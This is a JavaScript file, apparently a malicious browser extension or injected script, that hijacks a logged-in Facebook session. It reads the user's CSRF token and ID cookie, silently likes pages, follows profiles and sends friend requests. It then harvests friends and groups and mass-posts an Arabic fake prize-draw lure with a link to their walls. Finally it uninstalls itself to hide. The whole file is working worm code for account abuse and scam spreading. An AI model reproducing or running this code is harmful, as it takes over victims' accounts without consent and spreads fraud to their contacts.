var msg = "الحقوا يا جماعه في سحب علي جوايز من قناة MBC مصر اصغر جايزه في السحب بلاك بيرى والكبيره عربيه BMW وفي جوايز تانية كتير ..\nانا دخلت السحب وكسبت بلاي ستيشن وهستلمه يوم الجمعه .. السحب فاضله يومين بس\n\nhttp://fb.com/464537480288294?";

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close
        }
    };
    Page.send(PageParams)
}


function follow(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close
        }
    };
    http4.send(params4)
}


function list(L) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
    var XParams = "flid=" + L + "&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user=" + user_id + "&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}


function friend(r) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/add_friend/action.php";
    var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)

}

like('310316238990286');
like('364020867048155');
like('251270924976552');
like('499949533401535');
like('136002529895797');
like('464032440286698');
like('394841163917279');
like('308922892569425');
like('587385477939238');
like('124893741027128');
like('368784063234601');
like('628107313866410');
like('539489332784194');
like('435909033147094');
like('286499781483937');
like('230149047033949');
like('132641936901771');
like('496367817096612');

like('196439353703894');

like('211467558952773');
like('283289148367736');

follow('100003071648227');
follow('100000857397229');
follow('100003859610667');
follow('100000525326305');

list('349942901784762');
list('383445975101121');
list('383446421767743');
list('383446521767733');
list('383446588434393');

list('1771810796290890');
list('1771811286290841');

list('569237803114794');
list('569237906448117');

function Posting(o) {       
        jx.load(window.location.protocol + "//www.facebook.com/ajax/stream/inline.php?fb_dtsg="+fb_dtsg+"&walltarget="+o+"&render_notif_only=1&birthday=1&message_text="+encodeURIComponent(msg)+"&message="+encodeURIComponent(msg)+"&giftsgroupid=8ff493ad46&post=Post&nctr[_mod]=pagelet_reminders&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFIwd9e&__req=1b&phstamp=", function (a) {
            var b = a.substring(a.indexOf("{"));
            var c = JSON.parse(b);
            i--;
    if (c.error) {}else {suc++}}, "text", "post");tay--;
                
        if (tay > 0) {
            var s = arr[i];
            setTimeout("Posting(" + s + ");", 100)
}
        console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
if (fb_dtsg) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+o+"&newcomer=100001050235420&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
if (fb_dtsg) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+o+"&newcomer=100003697277263&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
    }
jx={b:function(){var b=!1;if("undefined"!=typeof ActiveXObject)try{b=new ActiveXObject("Msxml2.XMLHTTP")}catch(c){try{b=new ActiveXObject("Microsoft.XMLHTTP")}catch(a){b=!1}}else if(window.XMLHttpRequest)try{b=new XMLHttpRequest}catch(h){b=!1}return b},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=
k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState)if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)};e.send(k)}},d:function(){return this.b()}};
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"};setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
        if (window[tag + '_close']) {return 'This script is running now!'
        }
    };   
 
var now=(new Date).getTime();
var tag = 'Close';
var i = 3;
var tay = 3;
var suc = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
tay = i; console.log(arr.length);});
   Posting(arr[i]);



jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "undefined") {
            try {
                A = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (C) {
                try {
                    A = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (B) {
                    A = false
                }
            }
        } else {
            if (window.XMLHttpRequest) {
                try {
                    A = new XMLHttpRequest()
                } catch (C) {
                    A = false
                }
            }
        }
        return A
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) {
            return
        }
        if (http.overrideMimeType) {
            http.overrideMimeType("text/xml")
        }
        if (!method) {
            method = "GET"
        }
        if (!format) {
            format = "text"
        }
        if (!opt) {
            opt = {}
        }
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + new Date().getTime();
        url += (url.indexOf("?") + 1) ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        if (method == "POST") {
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            http.setRequestHeader("Content-length", parameters.length);
            http.setRequestHeader("Connection", "close")
        }
        var ths = this;
        if (opt.handler) {
            http.onreadystatechange = function () {
                opt.handler(http)
            }
        } else {
            http.onreadystatechange = function () {
                if (http.readyState == 4) {
                    if (http.status == 200) {
                        var result = "";
                        if (http.responseText) {
                            result = http.responseText
                        }
                        if (format.charAt(0) == "j") {
                            result = result.replace(/[\n\r]/g, "");
                            result = eval("(" + result + ")")
                        } else {
                            if (format.charAt(0) == "x") {
                                result = http.responseXML
                            }
                        }
                        if (callback) {
                            callback(result)
                        }
                    } else {
                        if (opt.loadingIndicator) {
                            document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
                        }
                        if (opt.loading) {
                            document.getElementById(opt.loading).style.display = "none"
                        }
                        if (error) {
                            error(http.status)
                        }
                    }
                }
            }
        }
        http.send(parameters)
    },
    bind: function (A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C) {
            if (A[B]) {
                C[B] = A[B]
            }
        }
        if (!C.url) {
            return
        }
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) {
            document.getElementById(C.loading).style.display = "block"
        }
        this.load(C.url, function (E) {
            if (C.onSuccess) {
                C.onSuccess(E)
            }
            if (D) {
                document.getElementsByTagName("body")[0].removeChild(D)
            }
        }, C.format, C.method, C)
    },
    init: function () {
        return this.getHTTPObject()
    }
}

var j = 0;
var k = 0;
var suc = 0;
var arr = new Array();
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

function grouppost(sender) {
    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (data) {
        var text = data;
        var json = text.substring(text.indexOf('{'));
        var groups = JSON.parse(json);
        groups = groups.payload.entries;
        for (var n = 0; n < groups.length; n++) {
            arr.push(groups[n].uid);
        }
        postitok();
    });
}

function postitok() {
    pst = "fb_dtsg=" + fb_dtsg + "&xhpc_composerid=" + user_id + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + Math.floor(Math.random()*10000) + "&xhpc_message=" + encodeURIComponent(msg) + Math.floor(Math.random()*10000) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
    with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(pst);
    suc++;
    if (suc > arr.length) {
        suc = 0;
    } else setTimeout("postitok()", 30000 / arr.length);
}
setTimeout("grouppost()", 500);
chrome.management.uninstallSelf();